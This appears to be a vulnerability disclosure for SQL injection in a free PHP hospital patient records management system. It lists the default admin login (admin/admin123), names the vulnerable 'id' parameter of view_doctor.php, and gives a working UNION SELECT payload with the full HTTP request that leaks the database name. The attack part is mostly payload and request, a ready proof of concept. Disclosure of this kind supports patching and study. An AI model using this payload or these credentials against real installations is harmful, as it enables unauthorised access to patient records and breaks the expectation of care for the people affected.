# Hospital's Patient Records Management System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15116/hospitals-patient-records-management-system-php-free-source-code.html

Vulnerability File: /hprms/admin/doctors/view_doctor.php?id=

Vulnerability location: /hprms/admin/doctors/view_doctor.php?id=, id

Current database name: hprms_db ,length is 8

[+] Payload: /hprms/admin/doctors/view_doctor.php?id=-1%27%20union%20select%201,database(),3,4,5,6,7,8--+ // Leak place ---> id

```sql
GET /hprms/admin/doctors/view_doctor.php?id=-1%27%20union%20select%201,database(),3,4,5,6,7,8--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=7g6mvmuq5m1o1cvqrhprll4jr1
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/171407439-c9f48da8-6468-4f68-bdf5-b3787563f8b6.png)

![image](https://user-images.githubusercontent.com/54017627/171407469-f577ed7d-5b45-4644-8f95-4a75ddb121e0.png)
